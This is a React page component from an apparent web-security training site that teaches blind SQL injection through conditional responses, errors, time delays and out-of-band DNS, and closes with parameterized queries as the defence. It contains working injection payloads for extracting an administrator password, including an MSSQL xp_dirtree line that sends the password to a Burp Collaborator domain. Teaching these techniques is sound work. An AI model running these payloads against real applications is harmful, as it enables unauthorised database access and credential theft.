import Lab from "../../Lab/Lab";
import Payloads from "../../Payloads/Payloads";
import "../XSS/XSSMaterial.css";
export default function BlindSql() {
    return (
        <div id="xss">
            <section className="mainbar">
                <section>
                    <h1>Blind SQL injection</h1>
                    <p>
                        In this section, we describe techniques for finding and
                        exploiting blind SQL injection vulnerabilities.
                    </p>
                </section>
                <section>
                    <h1>What is Blind SQL injection?</h1>
                    <p>
                        Blind SQL injection occurs when an application is
                        vulnerable to SQL injection, but its HTTP responses do
                        not contain the results of the relevant SQL query or the
                        details of any database errors.
                    </p>
                    <p>
                        Many techniques such as <span>UNION</span>{" "}
                        <u>attacks</u> are not effective with blind SQL
                        injection vulnerabilities. This is because they rely on
                        being able to see the results of the injected query
                        within the application's responses. It is still possible
                        to exploit blind SQL injection to access unauthorized
                        data, but different techniques must be used.
                    </p>
                </section>
                <section>
                    <h1>
                        Exploiting Blind SQL injection by triggering conditional
                        responses
                    </h1>
                    <p>
                        Consider an application that uses tracking cookies to
                        gather analytics about usage. Requests to the
                        application include a cookie header like this:
                    </p>
                    <Payloads>Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4</Payloads>
                    <p>
                        When a request containing a <span>TrackingId</span>{" "}
                        cookie is processed, the application uses a SQL query to
                        determine whether this is a known user:
                    </p>
                    <Payloads>
                        SELECT TrackingId FROM TrackedUsers WHERE TrackingId =
                        'u5YD3PapBcR4lN3e7Tj4'
                    </Payloads>
                    <p>
                        This query is vulnerable to SQL injection, but the
                        results from the query are not returned to the user.
                        However, the application does behave differently
                        depending on whether the query returns any data. If you
                        submit a recognized <span>TrackingId</span>, the query
                        returns data and you receive a "Welcome back" message in
                        the response.
                    </p>
                    <p>
                        This behavior is enough to be able to exploit the blind
                        SQL injection vulnerability. You can retrieve
                        information by triggering different responses
                        conditionally, depending on an injected condition.
                    </p>
                    <p>
                        To understand how this exploit works, suppose that two
                        requests are sent containing the following{" "}
                        <span>TrackingId</span> cookie values in turn:
                    </p>
                    <Payloads>
                        …xyz' AND '1'='1
                        <br />
                        …xyz' AND '1'='2
                    </Payloads>
                    <ul>
                        <li>
                            The first of these values causes the query to return
                            results, because the injected{" "}
                            <span>AND '1'='1</span> condition is true. As a
                            result, the "Welcome back" message is displayed.
                        </li>
                        <li>
                            The second value causes the query to not return any
                            results, because the injected condition is false.
                            The "Welcome back" message is not displayed.
                        </li>
                    </ul>
                    <p>
                        This allows us to determine the answer to any single
                        injected condition, and extract data one piece at a
                        time.
                    </p>
                    <p>
                        For example, suppose there is a table called{" "}
                        <span>Users</span> with the columns
                        <span>Username</span> and <span>Password</span>, and a
                        user called <span>Administrator</span>. You can
                        determine the password for this user by sending a series
                        of inputs to test the password one character at a time.
                    </p>
                    <p>To do this, start with the following input:</p>
                    <Payloads>
                        xyz' AND SUBSTRING((SELECT Password FROM Users WHERE
                        Username = 'Administrator'), 1, 1) {`>`} 'm
                    </Payloads>
                    <p>
                        This returns the "Welcome back" message, indicating that
                        the injected condition is true, and so the first
                        character of the password is greater than <span>m</span>
                        .
                    </p>
                    <p>Next, we send the following input:</p>
                    <Payloads>
                        xyz' AND SUBSTRING((SELECT Password FROM Users WHERE
                        Username = 'Administrator'), 1, 1) {`>`} 't
                    </Payloads>
                    <p>
                        This does not return the "Welcome back" message,
                        indicating that the injected condition is false, and so
                        the first character of the password is not greater than{" "}
                        <span>t</span>.
                    </p>
                    <p>
                        Eventually, we send the following input, which returns
                        the "Welcome back" message, thereby confirming that the
                        first character of the password is <span>s</span>:
                    </p>
                    <Payloads>
                        xyz' AND SUBSTRING((SELECT Password FROM Users WHERE
                        Username = 'Administrator'), 1, 1) = 's
                    </Payloads>
                    <p>
                        We can continue this process to systematically determine
                        the full password for the <span>Administrator</span>{" "}
                        user.
                    </p>
                    <div className="labbox">
                        <h3>Note</h3>
                        <p>
                            The <span>SUBSTRING</span> function is called{" "}
                            <span>SUBSTR</span> on some types of database. 
                        </p>
                    </div>
                </section>
                <section>
                    <h1>Error-based SQL injection</h1>
                    <p>
                        Error-based SQL injection refers to cases where you're
                        able to use error messages to either extract or infer
                        sensitive data from the database, even in blind
                        contexts. The possibilities depend on the configuration
                        of the database and the types of errors you're able to
                        trigger:
                    </p>
                    <ul>
                        <li>
                            You may be able to induce the application to return
                            a specific error response based on the result of a
                            boolean expression. You can exploit this in the same
                            way as the <u>conditional responses</u> we looked at
                            in the previous section. For more information, see <u>
                                Exploiting blind SQL injection by triggering
                                conditional errors
                            </u>
                            .
                        </li>
                        <li>
                            You may be able to trigger error messages that
                            output the data returned by the query. This
                            effectively turns otherwise blind SQL injection
                            vulnerabilities into visible ones. For more
                            information, see <u>
                                 Extracting sensitive data via verbose SQL error
                                messages
                            </u>
                            .
                        </li>
                    </ul>
                    <h3>
                        Exploiting blind SQL injection by triggering conditional
                        errors
                    </h3>
                    <p>
                        Some applications carry out SQL queries but their
                        behavior doesn't change, regardless of whether the query
                        returns any data. The technique in the previous section
                        won't work, because injecting different boolean
                        conditions makes no difference to the application's
                        responses.
                    </p>
                    <p>
                        It's often possible to induce the application to return
                        a different response depending on whether a SQL error
                        occurs. You can modify the query so that it causes a
                        database error only if the condition is true. Very
                        often, an unhandled error thrown by the database causes
                        some difference in the application's response, such as
                        an error message. This enables you to infer the truth of
                        the injected condition.
                    </p>
                    <p>
                        To see how this works, suppose that two requests are
                        sent containing the following TrackingId cookie values
                        in turn:
                    </p>
                    <Payloads>
                        xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a'
                        END)='a
                        <br />
                        xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a'
                        END)='a
                    </Payloads>
                    <p>
                        These inputs use the <span>CASE</span> keyword to test a
                        condition and return a different expression depending on
                        whether the expression is true:
                    </p>
                    <ul>
                        <li>
                            With the first input, the <span>CASE</span>{" "}
                            expression evaluates to <span>'a'</span>, which does
                            not cause any error.
                        </li>
                        <li>
                            With the second input, it evaluates to{" "}
                            <span>1/0</span>, which causes a divide-by-zero
                            error.
                        </li>
                    </ul>
                    <p>
                        If the error causes a difference in the application's
                        HTTP response, you can use this to determine whether the
                        injected condition is true.
                    </p>
                    <p>
                        Using this technique, you can retrieve data by testing
                        one character at a time:
                    </p>
                    <Payloads>
                        xyz' AND (SELECT CASE WHEN (Username = 'Administrator'
                        AND SUBSTRING(Password, 1, 1) {`>`} 'm') THEN 1/0 ELSE
                        'a' END FROM Users)='a
                    </Payloads>
                </section>
                <section>
                    <h3>
                        Extracting sensitive data via verbose SQL error messages
                    </h3>
                    <p>
                        Misconfiguration of the database sometimes results in
                        verbose error messages. These can provide information
                        that may be useful to an attacker. For example, consider
                        the following error message, which occurs after
                        injecting a single quote into an <span>id</span>{" "}
                        parameter:
                    </p>
                    <Payloads>
                        Unterminated string literal started at position 52 in
                        SQL SELECT * FROM tracking WHERE id = '''. Expected char
                    </Payloads>
                    <p>
                        This shows the full query that the application
                        constructed using our input. We can see that in this
                        case, we're injecting into a single-quoted string inside
                        a <span>WHERE</span> statement. This makes it easier to
                        construct a valid query containing a malicious payload.
                        Commenting out the rest of the query would prevent the
                        superfluous single-quote from breaking the syntax.
                    </p>
                    <p>
                        Occasionally, you may be able to induce the application
                        to generate an error message that contains some of the
                        data that is returned by the query. This effectively
                        turns an otherwise blind SQL injection vulnerability
                        into a visible one.
                    </p>
                    <p>
                        You can use the <span>CAST()</span> function to achieve
                        this. It enables you to convert one data type to
                        another. For example, imagine a query containing the
                        following statement:
                    </p>
                    <Payloads>
                        CAST((SELECT example_column FROM example_table) AS int)
                    </Payloads>
                    <p>
                        Often, the data that you're trying to read is a string.
                        Attempting to convert this to an incompatible data type,
                        such as an int, may cause an error similar to the
                        following:
                    </p>
                    <Payloads>
                        ERROR: invalid input syntax for type integer: "Example
                        data"
                    </Payloads>
                    <p>
                        This type of query may also be useful if a character
                        limit prevents you from triggering conditional
                        responses.
                    </p>
                </section>
                <section>
                    <h1>
                        Exploiting blind SQL injection by triggering time delays
                    </h1>
                    <p>
                        If the application catches database errors when the SQL
                        query is executed and handles them gracefully, there
                        won't be any difference in the application's response.
                        This means the previous technique for inducing
                        conditional errors will not work.
                    </p>
                    <p>
                        In this situation, it is often possible to exploit the
                        blind SQL injection vulnerability by triggering time
                        delays depending on whether an injected condition is
                        true or false. As SQL queries are normally processed
                        synchronously by the application, delaying the execution
                        of a SQL query also delays the HTTP response. This
                        allows you to determine the truth of the injected
                        condition based on the time taken to receive the HTTP
                        response.
                    </p>
                    <p>
                        The techniques for triggering a time delay are specific
                        to the type of database being used. For example, on
                        Microsoft SQL Server, you can use the following to test
                        a condition and trigger a delay depending on whether the
                        expression is true:
                    </p>
                    <Payloads>
                        '; IF (1=2) WAITFOR DELAY '0:0:10'--
                        <br />
                        '; IF (1=1) WAITFOR DELAY '0:0:10'--
                    </Payloads>
                    <ul>
                        <li>
                            The first of these inputs does not trigger a delay,
                            because the condition <span>1=2</span> is false.
                        </li>
                        <li>
                            The second input triggers a delay of 10 seconds,
                            because the condition <span>1=1</span> is true.
                        </li>
                    </ul>
                    <p>
                        Using this technique, we can retrieve data by testing
                        one character at a time:
                    </p>
                    <Payloads>
                        {`'; IF (SELECT COUNT(Username) FROM Users WHERE Username =
            'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR
            DELAY '0:0:{delay}'--`}
                    </Payloads>
                </section>
                <section>
                    <h1>
                        Exploiting blind SQL injection using out-of-band (OAST)
                        techniques
                    </h1>
                    <p>
                        An application might carry out the same SQL query as the
                        previous example but do it asynchronously. The
                        application continues processing the user's request in
                        the original thread, and uses another thread to execute
                        a SQL query using the tracking cookie. The query is
                        still vulnerable to SQL injection, but none of the
                        techniques described so far will work. The application's
                        response doesn't depend on the query returning any data,
                        a database error occurring, or on the time taken to
                        execute the query.
                    </p>
                    <p>
                        In this situation, it is often possible to exploit the
                        blind SQL injection vulnerability by triggering
                        out-of-band network interactions to a system that you
                        control. These can be triggered based on an injected
                        condition to infer information one piece at a time. More
                        usefully, data can be exfiltrated directly within the
                        network interaction.
                    </p>
                    <p>
                        A variety of network protocols can be used for this
                        purpose, but typically the most effective is DNS (domain
                        name service). Many production networks allow free
                        egress of DNS queries, because they're essential for the
                        normal operation of production systems.
                    </p>
                    <p>
                        The easiest and most reliable tool for using out-of-band
                        techniques is Burp Collaborator. This is a server that
                        provides custom implementations of various network
                        services, including DNS. It allows you to detect when
                        network interactions occur as a result of sending
                        individual payloads to a vulnerable application. Burp
                        Suite Professional includes a built-in client that's
                        configured to work with Burp Collaborator right out of
                        the box. For more information, see the documentation for
                        Burp Collaborator.
                    </p>
                    <p>
                        The techniques for triggering a DNS query are specific
                        to the type of database being used. For example, the
                        following input on Microsoft SQL Server can be used to
                        cause a DNS lookup on a specified domain:
                    </p>
                    <Payloads>
                        '; exec master..xp_dirtree
                        '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
                    </Payloads>
                    <p>
                        This causes the database to perform a lookup for the
                        following domain:
                    </p>
                    <Payloads>
                        0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
                    </Payloads>
                    <p>
                        You can use Burp Collaborator to generate a unique
                        subdomain and poll the Collaborator server to confirm
                        when any DNS lookups occur.
                    </p>
                    <p>
                        Having confirmed a way to trigger out-of-band
                        interactions, you can then use the out-of-band channel
                        to exfiltrate data from the vulnerable application. For
                        example:
                    </p>
                    <Payloads>
                        '; declare @p varchar(1024);set @p=(SELECT password FROM
                        users WHERE
                        username='Administrator');exec('master..xp_dirtree
                        "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
                    </Payloads>
                    <p>
                        This input reads the password for the{" "}
                        <span>Administrator</span> user, appends a unique
                        Collaborator subdomain, and triggers a DNS lookup. This
                        lookup allows you to view the captured password:
                    </p>
                    <Payloads>
                        S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
                    </Payloads>
                    <p>
                        Out-of-band (OAST) techniques are a powerful way to
                        detect and exploit blind SQL injection, due to the high
                        chance of success and the ability to directly exfiltrate
                        data within the out-of-band channel. For this reason,
                        OAST techniques are often preferable even in situations
                        where other techniques for blind exploitation do work.
                    </p>
                </section>
                <section>
                    <h1>How to prevent blind SQL injection attacks?</h1>
                    <p>
                        Although the techniques needed to find and exploit blind
                        SQL injection vulnerabilities are different and more
                        sophisticated than for regular SQL injection, the
                        measures needed to prevent SQL injection are the same.
                    </p>
                    <p>
                        As with regular SQL injection, blind SQL injection
                        attacks can be prevented through the careful use of
                        parameterized queries, which ensure that user input
                        cannot interfere with the structure of the intended SQL
                        query.
                    </p>
                    <div className="labbox">
                        <h3>Read more</h3>
                        <ul>
                            <li>How to prevent SQL injection</li>
                        </ul>
                    </div>
                </section>
            </section>
        </div>
    );
}
